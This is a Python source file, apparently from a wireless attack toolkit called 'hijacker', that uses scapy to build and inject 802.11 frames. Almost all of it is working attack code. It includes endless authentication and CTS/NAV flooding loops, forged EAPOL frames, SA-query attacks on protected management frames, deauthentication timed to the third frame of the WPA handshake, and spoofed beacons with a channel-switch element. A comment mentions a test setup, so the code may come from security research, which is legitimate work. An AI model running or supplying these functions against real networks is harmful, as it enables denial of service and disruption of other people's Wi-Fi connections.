from time import sleep

from scapy.contrib.wpa_eapol import WPA_key
from scapy.fields import ByteField
from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Elt, Dot11Beacon
from scapy.packet import Packet
from scapy.sendrecv import sniff
from termcolor import cprint

from hijacker.core import Station, AP
from hijacker.interface import MonitorInterface

WPA_KEY_INFO_INSTALL = 64
WPA_KEY_INFO_ACK = 128
WPA_KEY_INFO_MIC = 256


def auth_attack(interface, sta, ap):
    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    while True:
        cprint("ZZZ", 'blue')
        interface.inject(pkt)
        pkt.SC += 1
        sleep(0.3)


def forged_1(interface, ap, sta):
    pkt = RadioTap() / Dot11(addr1=sta.mac_addr, addr2=ap.bssid, addr3=ap.bssid) / \
          EAPOL(type=3)
    interface.inject(pkt)


def cts_nav_attack(interface):
    # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
    # pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
    pkt = RadioTap() / Dot11(type=1, subtype=12, ID=0xff7f, addr1="ff:ff:ff:ff:ff:ff")
    while True:
        interface.inject(pkt)


def sa_query_attack(interface, ap, sta):
    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    interface.inject(pkt)
    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11AssoReq(cap=0x3104, listen_interval=0x0001) / Dot11Elt(ID=0, info="Wireless Attack Testbed") / \
          Dot11EltRates() / Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
        '\x01\x00'  # 2 Pairwise Cipher Suite (next line)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x80\x00'))  # Supports MFP
    interface.inject(pkt)


def ap_deauth(interface: MonitorInterface, ap: AP, sta: Station):
    def ap_deauth_cb(p):
        # https://digi.ninja/gawn_gold/4whsg.py
        if p.haslayer(WPA_key) and p.addr3 == ap.bssid and p.addr1 == sta.mac_addr:
            layer = p.getlayer(WPA_key)
            key = layer.key_info
            if key & WPA_KEY_INFO_MIC and key & WPA_KEY_INFO_INSTALL and key & WPA_KEY_INFO_ACK:  # frame 3
                cprint("Attacking {}!".format(p.addr1), 'red')
                interface.deauth(ap.bssid, sta.mac_addr, burst_count=5, reason=3)

    return ap_deauth_cb


def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam: bool = False):
    while spam:
        interface.deauth(ap.bssid, sta.mac_addr, count=100, reason=3)
    print("Waiting for EAPOL frame 3...")
    sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))


def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid: str, channel: int):
    pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap.bssid, addr3=ap.bssid) / \
          Dot11Beacon(cap=0x9104) / Dot11Elt(ID='SSID', info=essid, len=len(essid)) / \
          Dot11Elt(ID='RSNinfo', info=(
              '\x01\x00'  # RSN Version 1
              '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
              '\x01\x00'  # 2 Pairwise Cipher Suite (next line)
              '\x00\x0f\xac\x04'  # AES Cipher
              '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
              '\x00\x0f\xac\x02'  # Pre-Shared Key
              '\xcc\x00'  # Supports and requires MFP
          )) / Dot11Elt(ID=37, len=3, info=bytes([0, channel, 1]))
    while True:
        interface.inject(pkt)
        sleep(0.3)


class Dot11EltRates(Packet):
    """
    Our own definition for the supported rates field
    """
    name = "802.11 Rates Information Element"
    # Our Test AP has the rates 6, 9, 12 (B), 18, 24, 36, 48 and 54, with 12
    # Mbps as the basic rate - which does not have to concern us.
    supported_rates = [0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c]

    fields_desc = [
        ByteField("ID", 1),
        ByteField("len", len(supported_rates))
    ]

    for index, rate in enumerate(supported_rates):
        fields_desc.append(ByteField("supported_rate{0}".format(
            index + 1), rate))
